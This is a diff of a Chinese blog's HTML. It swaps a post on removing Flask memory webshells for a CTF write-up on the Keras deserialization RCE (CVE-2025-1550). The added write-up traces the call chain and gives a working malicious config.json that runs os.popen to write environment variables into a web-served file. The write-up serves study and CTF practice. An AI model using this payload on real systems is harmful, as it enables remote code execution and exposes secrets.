@@ -19,23 +19,26 @@
   <meta name="author" content="xiaotian">
   <meta name="keywords" content="xt,blog,个人博客,生活,学习,工作">
   
-    <meta name="description" content="本文介绍如何在 Flask 应用的内存中查杀内存马（Webshell），重点是如何通过操作 Flask 应用对象 &lt;Flask &#39;app&#39;&gt; 来发现并清除恶意代码。  内存马通常是通过动态代码注入的方式存在于内存中，利用 Flask 应用的生命周期和钩子函数来隐藏自身行为。查杀内存马关键在于：  找到 Flask 进程对应的 Python 运行环境 访问 Flask 应">
+    <meta name="description" content="demodelKeras&lt;3.9.0 远程代码执行漏洞(CVE-2025-1550)擦查资料： 阿里云漏洞库 漏洞描述 Keras 是用于构建和训练深度学习模型的神经网络 API。 受影响版本中，由于 functional.py 中的 process_layer 方法反序列化前未检查对象是否属于合法的 Keras 层，导致 Model.load_model 函数使在 safe_mode&amp;#x">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flask内存马查杀">
-<meta property="og:url" content="https://www.xiaotian.org.cn/2025/05/28/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/index.html">
+<meta property="og:title" content="D3CTF-Web-WP">
+<meta property="og:url" content="https://www.xiaotian.org.cn/2025/05/31/D3CTF-Web-WP/index.html">
 <meta property="og:site_name" content="xt&#39;s blog">
-<meta property="og:description" content="本文介绍如何在 Flask 应用的内存中查杀内存马（Webshell），重点是如何通过操作 Flask 应用对象 &lt;Flask &#39;app&#39;&gt; 来发现并清除恶意代码。  内存马通常是通过动态代码注入的方式存在于内存中，利用 Flask 应用的生命周期和钩子函数来隐藏自身行为。查杀内存马关键在于：  找到 Flask 进程对应的 Python 运行环境 访问 Flask 应">
+<meta property="og:description" content="demodelKeras&lt;3.9.0 远程代码执行漏洞(CVE-2025-1550)擦查资料： 阿里云漏洞库 漏洞描述 Keras 是用于构建和训练深度学习模型的神经网络 API。 受影响版本中，由于 functional.py 中的 process_layer 方法反序列化前未检查对象是否属于合法的 Keras 层，导致 Model.load_model 函数使在 safe_mode&amp;#x">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-05-28T15:10:12.000Z">
-<meta property="article:modified_time" content="2025-05-29T01:22:53.931Z">
+<meta property="og:image" content="https://www.xiaotian.org.cn/2024/10/10/2024buildCTF/img2.png">
+<meta property="og:image" content="https://www.xiaotian.org.cn/2024/10/10/2024buildCTF/img.png">
+<meta property="article:published_time" content="2025-05-31T15:10:12.000Z">
+<meta property="article:modified_time" content="2025-05-31T06:24:27.128Z">
 <meta property="article:author" content="xiaotian">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.xiaotian.org.cn/2024/10/10/2024buildCTF/img2.png">
   
   
   
-  <title>Flask内存马查杀 - xt&#39;s blog</title>
+  <title>D3CTF-Web-WP - xt&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +216,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Flask内存马查杀"></span>
+            <span id="subtitle" data-typed-text="D3CTF-Web-WP"></span>
           
         </div>
 
@@ -224,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-28 23:10" pubdate>
-          2025年5月28日 晚上
+        <time datetime="2025-05-31 23:10" pubdate>
+          2025年5月31日 晚上
         </time>
       </span>
     
@@ -236,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          536 字
+          482 字
         
       </span>
     
@@ -284,56 +287,34 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Flask内存马查杀</h1>
+            <h1 id="seo-header">D3CTF-Web-WP</h1>
             
             
               <div class="markdown-body">
                 
-                <p>本文介绍如何在 Flask 应用的内存中查杀内存马（Webshell），重点是如何通过操作 Flask 应用对象 <code>&lt;Flask &#39;app&#39;&gt;</code> 来发现并清除恶意代码。</p>
-<hr>
-<p>内存马通常是通过动态代码注入的方式存在于内存中，利用 Flask 应用的生命周期和钩子函数来隐藏自身行为。查杀内存马关键在于：</p>
-<ul>
-<li>找到 Flask 进程对应的 Python 运行环境</li>
-<li>访问 Flask 应用对象，分析其属性和注册的钩子、路由等</li>
-<li>识别并定位恶意注入的函数或钩子，进行清除或禁用</li>
-</ul>
-<hr>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>这里我们使用 <strong>pyrasite</strong> 这个开源工具，能够注入代码到运行中的 Python 进程，实时交互并调试。</p>
-<h3 id="安装-pyrasite"><a href="#安装-pyrasite" class="headerlink" title="安装 pyrasite"></a>安装 pyrasite</h3><blockquote>
-<p>建议直接从 GitHub 克隆最新版安装，pypi的不行</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lmacken/pyrasite.git<br>pip install ./pyrasite<br></code></pre></td></tr></table></figure>
+                <h2 id="demodel"><a href="#demodel" class="headerlink" title="demodel"></a>demodel</h2><h5 id="Keras"><a href="#Keras" class="headerlink" title="Keras&lt;3.9.0 远程代码执行漏洞(CVE-2025-1550)"></a>Keras&lt;3.9.0 远程代码执行漏洞(CVE-2025-1550)</h5><p>擦查资料：</p>
+<p>阿里云漏洞库</p>
+<p>漏洞描述</p>
+<p>Keras 是用于构建和训练深度学习模型的神经网络 API。</p>
+<p>受影响版本中，由于 functional.py 中的 process_layer 方法反序列化前未检查对象是否属于合法的 Keras 层，导致 Model.load_model 函数使在 safe_mode&#x3D;True 的情况下仍存在反序列化漏洞。</p>
+<p>攻击者可构造包含恶意 config.json 文件的 .keras 文件，当被加载时触发恶意代码执行。</p>
+<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://app.codecov.io/gh/keras-team/keras/pull/20751">https://app.codecov.io/gh/keras-team/keras/pull/20751</a></p>
+<p>正常走不到补丁的process_layer 方法（在functional_from_config中调用）</p>
+<p>倒着找调用functional_from_config的方法：Model.from_config</p>
+<p>serialization_lib._retrieve_class_or_fn方法中：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">try</span>:<br>    mod = importlib.import_module(module)<br><span class="hljs-keyword">except</span> ModuleNotFoundError:<br>    <span class="hljs-keyword">raise</span> TypeError(<br>        <span class="hljs-string">f&quot;Could not deserialize <span class="hljs-subst">&#123;obj_type&#125;</span> &#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27; because &quot;</span><br>        <span class="hljs-string">f&quot;its parent module <span class="hljs-subst">&#123;module&#125;</span> cannot be imported. &quot;</span><br>        <span class="hljs-string">f&quot;Full object config: <span class="hljs-subst">&#123;full_config&#125;</span>&quot;</span><br>    )<br>obj = <span class="hljs-built_in">vars</span>(mod).get(name, <span class="hljs-literal">None</span>)<span class="hljs-comment">#这里可以导入任意模块并返回函数，思路是这里返回向popen函数能不能有地方调用，最后找到在functional.process_node调用，并且参数可控</span><br>后面会返回obj<br></code></pre></td></tr></table></figure>
 
-<hr>
-<h2 id="查杀步骤"><a href="#查杀步骤" class="headerlink" title="查杀步骤"></a>查杀步骤</h2><h3 id="1-找到-Flask-进程-ID"><a href="#1-找到-Flask-进程-ID" class="headerlink" title="1. 找到 Flask 进程 ID"></a>1. 找到 Flask 进程 ID</h3><p>使用命令查看运行中的 Flask 应用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep python<br></code></pre></td></tr></table></figure>
+<p>控制module&#x3D;keras.models，name&#x3D;Model</p>
+<p>之后</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">saveing_api.load_model<br>save_lib.load_model<br>save_lib._load_model_from_fileobj<br>save_lib._model_from_config<br>serialization_lib.deserialize_keras_object<br>cls = _retrieve_class_or_fn(<br>        class_name,<br>        registered_name,<br>        module,<br>        <span class="hljs-attribute">obj_type</span>=<span class="hljs-string">&quot;class&quot;</span>,<br>        <span class="hljs-attribute">full_config</span>=config,<br>        <span class="hljs-attribute">custom_objects</span>=custom_objects,<br>    )<br>cls就是Model<br>然后cls.from_config(inner_config)进入from_config调用functional_from_config：<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;module&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> layer_data:<br>            # Legacy format deserialization (<span class="hljs-literal">no</span> <span class="hljs-string">&quot;module&quot;</span> key)<br>            # used <span class="hljs-keyword">for</span> H5 <span class="hljs-keyword">and</span> SavedModel formats<br>            layer = saving_utils.model_from_config(<br>                layer_data, <span class="hljs-attribute">custom_objects</span>=custom_objects<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            layer = serialization_lib.deserialize_keras_object(<br>                layer_data, <span class="hljs-attribute">custom_objects</span>=custom_objects<br>            )<br>        created_layers[layer_name] = layer<br>构造让serialization_lib.deserialize_keras_object返回popen即可<br>然后构造让它能走到process_node（会调用layer,恰好layer与args都可控）<br></code></pre></td></tr></table></figure>
 
-<p>或者针对 Flask 启动脚本查找：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep app.py<br></code></pre></td></tr></table></figure>
+<p><img src="/2024/10/10/2024buildCTF/img2.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用链：</p>
+<p><img src="/2024/10/10/2024buildCTF/img.png" srcset="/img/loading.gif" lazyload></p>
+<p>config.json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;class_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Model&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keras.models&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my_model&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;class_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;popen&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;os&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;inbound_nodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>          <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;mkdir static;env&gt;static/1.txt&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;kwargs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span> <br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;output_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>假设 Flask 进程 PID 为 <code>8</code>。</p>
-<hr>
-<h3 id="2-注入交互-Shell"><a href="#2-注入交互-Shell" class="headerlink" title="2. 注入交互 Shell"></a>2. 注入交互 Shell</h3><p>注入 Python 交互式 shell 到 Flask 进程：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pyrasite-shell 8<br></code></pre></td></tr></table></figure>
-
-<p>这样就可以在 Flask 进程中执行任意 Python 代码。</p>
-<hr>
-<h3 id="3-访问-Flask-应用对象"><a href="#3-访问-Flask-应用对象" class="headerlink" title="3. 访问 Flask 应用对象"></a>3. 访问 Flask 应用对象</h3><p>进入 shell 后，找到 Flask 应用对象。一般常见变量名是 <code>app</code> 或 <code>application</code>，如果不知道变量名，可通过 <code>globals()</code> 或 <code>locals()</code> 查找。</p>
-<p>常用属性包括：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">app.after_request_funcs       <span class="hljs-comment"># 请求后钩子函数字典</span><br>app.before_request_funcs      <span class="hljs-comment"># 请求前钩子函数字典</span><br>app.url_map                   <span class="hljs-comment"># 路由映射表</span><br>app.view_functions            <span class="hljs-comment"># 路由对应的处理函数字典</span><br>app.error_handler_spec        <span class="hljs-comment"># 错误处理函数映射</span><br></code></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="4-查找恶意钩子或路由"><a href="#4-查找恶意钩子或路由" class="headerlink" title="4. 查找恶意钩子或路由"></a>4. 查找恶意钩子或路由</h3><p>查看所有注册的路由及对应函数：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> route, func <span class="hljs-keyword">in</span> app.view_functions.items():<br>    <span class="hljs-built_in">print</span>(route, func)<br></code></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="5-分析错误处理钩子"><a href="#5-分析错误处理钩子" class="headerlink" title="5. 分析错误处理钩子"></a>5. 分析错误处理钩子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">exc_class, code = app._get_exc_class_and_code(<span class="hljs-number">404</span>)<br>malicious_handler = app.error_handler_spec.get(<span class="hljs-literal">None</span>, &#123;&#125;).get(code, &#123;&#125;).get(exc_class)<span class="hljs-comment">#exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class]</span><br><span class="hljs-keyword">import</span> dis<br>dis.dis(malicious_handler)<br></code></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="6-反汇编可疑函数"><a href="#6-反汇编可疑函数" class="headerlink" title="6. 反汇编可疑函数"></a>6. 反汇编可疑函数</h3><p>利用 Python 的 <code>dis</code> 模块对可疑函数进行反汇编，查看底层字节码逻辑：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dis<br>dis.dis(app.view_functions[<span class="hljs-string">&#x27;shell&#x27;</span>])<br></code></pre></td></tr></table></figure>
-
-<p>通过字节码分析判断函数是否含有执行系统命令、执行动态代码等行为。</p>
+<p>“input_layers”: “”,<br>    “output_layers”: “”也是因为中途有判断，加进去的，缺少就8行了</p>
 
                 
               </div>
@@ -357,8 +338,15 @@
   
     <span>></span>
     
-  <a href="/categories/%E6%8A%80%E6%9C%AF/web/" class="category-chain-item">web</a>
+  <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/" class="category-chain-item">ctf</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%8A%80%E6%9C%AF/ctf/web/" class="category-chain-item">web</a>
+  
+  
+
   
 
   
@@ -388,8 +376,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Flask内存马查杀</div>
-      <div>https://www.xiaotian.org.cn/2025/05/28/Flask内存马查杀/</div>
+      <div>D3CTF-Web-WP</div>
+      <div>https://www.xiaotian.org.cn/2025/05/31/D3CTF-Web-WP/</div>
     </div>
     <div class="license-meta">
       
@@ -401,7 +389,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年5月28日</div>
+          <div>2025年5月31日</div>
         </div>
       
       
@@ -433,18 +421,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/05/31/D3CTF-Web-WP/" title="D3CTF-Web-WP">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">D3CTF-Web-WP</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/28/Linux%E6%8F%90%E6%9D%83%E7%AF%87/" title="Linux提权">
-                        <span class="hidden-mobile">Linux提权</span>
+                      <a href="/2025/05/28/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/" title="Flask内存马查杀">
+                        <span class="hidden-mobile">Flask内存马查杀</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
